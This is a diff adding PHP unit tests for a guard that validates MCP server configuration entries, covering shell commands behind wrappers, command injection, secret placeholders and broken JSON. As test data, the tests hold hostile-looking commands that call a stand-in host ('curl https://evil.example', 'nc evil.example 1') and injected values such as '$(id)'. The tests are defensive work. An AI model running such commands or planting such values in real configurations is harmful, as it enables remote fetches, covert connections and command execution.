@@ -82,4 +82,37 @@ final class McpFileTest extends TestCase {
         self::assertNull($guard->problem(McpEntry::fromArray('x', ['command' => 'npx', 'args' => ['-y', 'ssh-mcp']])));
         self::assertNull($guard->problem(McpEntry::fromArray('x', ['url' => 'https://a.example/mcp'])));
     }
+
+    public function testAShellAfterAWrapperIsFoundWhateverItsOptions(): void {
+        $guard = new McpEntryGuard();
+
+        self::assertNotNull($guard->problem(McpEntry::fromArray('x', ['command' => 'env', 'args' => ['-S', 'bash -c "curl https://evil.example"']])));
+        self::assertNotNull($guard->problem(McpEntry::fromArray('x', ['command' => 'timeout', 'args' => ['--signal', 'KILL', '10', 'sh', '-c', 'nc evil.example 1']])));
+    }
+
+    public function testACommandIsOneWordAndItsArgumentsAreQuoted(): void {
+        foreach (['npx x; curl https://evil.example', 'bash -c', 'a|b', '$(id)'] as $command) {
+            try {
+                McpEntry::fromArray('x', ['command' => $command]);
+                self::fail('taken: ' . $command);
+            } catch (\InvalidArgumentException) {
+            }
+        }
+        self::assertSame("stdio:/usr/bin/node 'a b'", McpEntry::fromArray('x', ['command' => '/usr/bin/node', 'args' => ['a b']])->connection()[0]);
+    }
+
+    public function testASecretNameHasNoColon(): void {
+        self::assertNotNull(McpEntry::fromArray('x', ['url' => 'https://a.example/mcp', 'headers' => ['Authorization' => 'Bearer {a:VAR}']])->problem());
+        self::assertNotNull(McpEntry::fromArray('x', ['command' => 'node', 'env' => ['T' => '{a:b}']])->problem());
+    }
+
+    public function testABrokenFileIsToldFromAnEmptyOne(): void {
+        foreach (['', '{}', '[1]', '{not json', '{"mcpServers": 5}'] as $text) {
+            self::assertTrue(McpFile::parse($text)->broken, 'broken: ' . $text);
+        }
+        self::assertFalse(McpFile::parse('{"mcpServers": {}}')->broken);
+        $file = McpFile::parse('{"mcpServers": {"docs": {"url": "ftp://x"}, "Bad Name": {}}}');
+        self::assertSame(['docs'], array_keys($file->bad), 'a bad entry keeps its name when it has one');
+        self::assertCount(2, $file->errors);
+    }
 }
